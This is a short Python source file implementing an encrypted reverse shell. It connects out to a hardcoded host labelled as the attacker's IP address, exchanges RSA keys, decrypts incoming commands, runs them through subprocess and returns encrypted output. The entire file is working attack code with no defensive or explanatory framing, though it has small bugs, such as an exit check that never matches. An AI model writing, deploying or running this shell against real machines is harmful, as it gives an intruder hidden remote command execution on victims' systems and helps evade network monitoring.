# pylint: disable=bare-except, missing-docstring, import-error
import socket
import subprocess
import os
from cryptidy import asymmetric_encryption as ae

HOST = '10.0.2.4'  # Attacker's IP address
PORT = 12345  # Same port number used in the listener
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

priv_key, pub_key = ae.generate_keys(2048)  # 2048 bits RSA key
s.send(pub_key.encode())

attacker_pub_key = s.recv(1024).decode()

try:
    while True:
        encrypted_command = s.recv(1024)
        _, attacker_input = ae.decrypt_message(encrypted_command, priv_key)
        attacker_input = attacker_input.split(' ')
        if attacker_input == 'exit':
            s.close()
            break
        
        if attacker_input[0] == 'cd':
            if len(attacker_input) != 2:
                s.send('Please only use cd by itself with one argument. ex: "cd _____"')
            else:
                os.chdir(attacker_input[1])
                s.send(b'\n')
        elif len(attacker_input) > 0:
            result = subprocess.run(attacker_input, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, check=False)
            result = result.stdout.decode()
            encrypted_output = ae.encrypt_message(result, attacker_pub_key)
            s.send(encrypted_output)
        else:
            s.send(b' ')
except:
    s.close()
